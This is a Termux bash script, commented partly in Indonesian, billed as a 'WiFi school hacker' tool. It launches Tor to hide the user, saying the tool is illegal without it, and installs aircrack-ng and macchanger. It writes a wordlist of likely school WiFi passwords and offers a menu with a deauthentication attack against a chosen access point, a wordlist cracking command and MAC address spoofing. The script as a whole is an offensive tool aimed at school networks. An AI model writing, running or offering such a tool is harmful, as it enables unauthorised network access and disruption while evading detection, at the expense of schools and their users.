#!/data/data/com.termux/files/usr/bin/bash

# Warna keren
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ============================================
# 🎭 VPN CHECK - FIXED TOR CONFLICT!
# ============================================

clear
echo -e "${PURPLE}"
echo "╔════════════════════════════════════════╗"
echo "║   NESIA DARKNET - VPN FIRST SYSTEM     ║"
echo "║    NO VPN = NO HACKING 😈              ║"
echo "╚════════════════════════════════════════╝${NC}"
echo ""

# ============================================
# 🚀 FIX 1: KILL ALL EXISTING TOR FIRST!
# ============================================

echo -e "${YELLOW}[+] Cleaning previous TOR processes...${NC}"
pkill -9 tor 2>/dev/null
pkill -9 -f "tor" 2>/dev/null
sleep 2

# Cek apakah port 9050 masih dipakai
if lsof -i :9050 >/dev/null 2>&1; then
    echo -e "${RED}[!] Port 9050 masih digunakan!${NC}"
    echo -e "${YELLOW}[+] Force killing...${NC}"
    fuser -k 9050/tcp 2>/dev/null
fi

# ============================================
# 🛠️ VPN ACTIVATION FUNCTION
# ============================================

vpn_activation() {
    echo -e "${YELLOW}[+] CHECKING VPN CONNECTION...${NC}"
    
    # Install TOR jika belum ada
    if ! command -v tor &> /dev/null; then
        echo -e "${RED}[!] TOR belum terinstall!${NC}"
        echo -e "${GREEN}[+] Installing TOR...${NC}"
        pkg install tor -y
    fi
    
    # Pastikan TOR benar-benar mati dulu
    pkill -9 tor 2>/dev/null
    sleep 1
    
    # Start TOR service
    echo -e "${YELLOW}[+] Starting TOR VPN Service...${NC}"
    tor &
    TOR_PID=$!
    
    # Tunggu dengan progress bar
    echo -ne "${CYAN}[+] Waiting for TOR"
    for i in {1..15}; do
        sleep 1
        echo -ne "."
        
        # Cek jika TOR mati
        if ! kill -0 $TOR_PID 2>/dev/null; then
            echo -e "\n${RED}[!] TOR process died!${NC}"
            return 1
        fi
        
        # Cek jika port 9050 sudah listening
        if netstat -tuln 2>/dev/null | grep -q ":9050"; then
            echo -e "\n${GREEN}[✓] TOR port 9050 listening!${NC}"
            break
        fi
    done
    echo ""
    
    # Tes koneksi TOR
    echo -e "${CYAN}[+] Testing VPN connection...${NC}"
    
    # Metode 1: Cek dengan timeout
    if curl --socks5-hostname 127.0.0.1:9050 --max-time 10 -s https://api.ipify.org >/dev/null 2>&1; then
        echo -e "${GREEN}[✓] VPN TOR AKTIF!${NC}"
        echo -e "${BLUE}[+] Your IP:${NC}"
        curl --socks5-hostname 127.0.0.1:9050 --max-time 5 -s https://api.ipify.org
        echo ""
        return 0
    else
        # Metode 2: Cek port saja
        if netstat -tuln 2>/dev/null | grep -q ":9050"; then
            echo -e "${YELLOW}[!] Port 9050 aktif tapi tes gagal${NC}"
            echo -e "${YELLOW}[+] Continuing anyway...${NC}"
            return 0
        else
            echo -e "${RED}[✗] VPN GAGAL${NC}"
            return 1
        fi
    fi
}

# ============================================
# 🚀 EKSEKUSI UTAMA
# ============================================

echo -e "${RED}[‼] PERINGATAN:${NC}"
echo -e "${YELLOW}[+] Tool ini ILLEGAL tanpa VPN!${NC}"
echo -e "${CYAN}[+] VPN akan diaktifkan otomatis...${NC}"
echo ""

# Jalankan VPN activation
if vpn_activation; then
    echo -e "${GREEN}[✓] VPN CHECK PASSED!${NC}"
    
    # ============================================
    # 🖥️ LANGSUNG KE MENU UTAMA
    # ============================================
    
    clear
    echo -e "${GREEN}"
    echo "╔════════════════════════════════════════╗"
    echo "║   WIFI SCHOOL HACKER v4.0             ║"
    echo "║   VPN STATUS: ✅ AKTIF                 ║"
    echo "║   SIMPLE & WORKING! 😎                ║"
    echo "╚════════════════════════════════════════╝${NC}"
    echo ""
    
    # Install tools yang diperlukan
    echo -e "${YELLOW}[+] Installing required tools...${NC}"
    pkg install -y aircrack-ng macchanger curl wget
    
    # Buat wordlist sederhana
    cat > school_passwords.txt << EOF
admin
admin123
password
password123
123456
12345678
school
school123
sekolah
sekolah123
smk2024
smk2023
guru
guru123
siswa
siswa123
EOF
    
    # Menu utama sederhana
    while true; do
        echo ""
        echo -e "${BLUE}╔══════════════════════════════════╗${NC}"
        echo -e "${BLUE}║         SIMPLE MENU              ║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════╣${NC}"
        echo -e "${BLUE}║ 1. Scan WiFi Networks           ║${NC}"
        echo -e "${BLUE}║ 2. Test Deauth Attack           ║${NC}"
        echo -e "${BLUE}║ 3. Crack with Wordlist          ║${NC}"
        echo -e "${BLUE}║ 4. Change MAC Address           ║${NC}"
        echo -e "${BLUE}║ 5. Check VPN Status             ║${NC}"
        echo -e "${BLUE}║ 6. Exit & Clean                 ║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════╝${NC}"
        echo ""
        
        read -p "Pilih [1-6]: " choice
        
        case $choice in
            1)
                echo -e "${RED}[+] Scanning WiFi...${NC}"
                termux-wifi-scaninfo
                ;;
            2)
                echo -e "${RED}[+] Deauth Attack Test${NC}"
                read -p "Masukkan BSSID target: " target_bssid
                echo -e "${YELLOW}[+] Run: aireplay-ng -0 10 -a $target_bssid wlan0${NC}"
                ;;
            3)
                echo -e "${RED}[+] Wordlist Attack${NC}"
                echo -e "${YELLOW}[+] Wordlist: school_passwords.txt${NC}"
                echo -e "${YELLOW}[+] Use: aircrack-ng -w school_passwords.txt capture.cap${NC}"
                ;;
            4)
                echo -e "${RED}[+] Changing MAC Address...${NC}"
                ip link set wlan0 down
                macchanger -r wlan0
                ip link set wlan0 up
                echo -e "${GREEN}[✓] MAC Address changed!${NC}"
                ;;
            5)
                echo -e "${GREEN}[+] VPN Status:${NC}"
                curl --socks5-hostname 127.0.0.1:9050 -s https://api.ipify.org
                echo ""
                ps aux | grep -v grep | grep tor
                ;;
            6)
                echo -e "${YELLOW}[+] Cleaning up...${NC}"
                pkill tor 2>/dev/null
                rm -f school_passwords.txt
                echo -e "${GREEN}[✓] Clean exit!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid choice${NC}"
                ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
        clear
        echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║   WIFI SCHOOL HACKER v4.0             ║${NC}"
        echo -e "${GREEN}║   VPN STATUS: ✅ AKTIF                 ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
        echo ""
    done
    
else
    echo -e "${RED}[✗] VPN ACTIVATION FAILED!${NC}"
    echo -e "${YELLOW}[+] Trying WITHOUT VPN (LIMITED)...${NC}"
    
    # Mode tanpa VPN
    echo ""
    echo -e "${RED}╔════════════════════════════════════════╗${NC}"
    echo -e "${RED}║   WARNING: NO VPN PROTECTION!         ║${NC}"
    echo -e "${RED}║   USE AT YOUR OWN RISK!               ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "Continue anyway? (y/n): " -n 1 -r
    echo ""
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}[+] Installing basic tools...${NC}"
        pkg install -y curl wget
        
        echo -e "${GREEN}[+] Basic tools installed!${NC}"
        echo -e "${YELLOW}[+] Commands you can try:${NC}"
        echo "  termux-wifi-scaninfo"
        echo "  ifconfig wlan0"
        echo "  iwconfig wlan0"
    else
        echo -e "${RED}[+] Exiting...${NC}"
        exit 1
    fi
fi
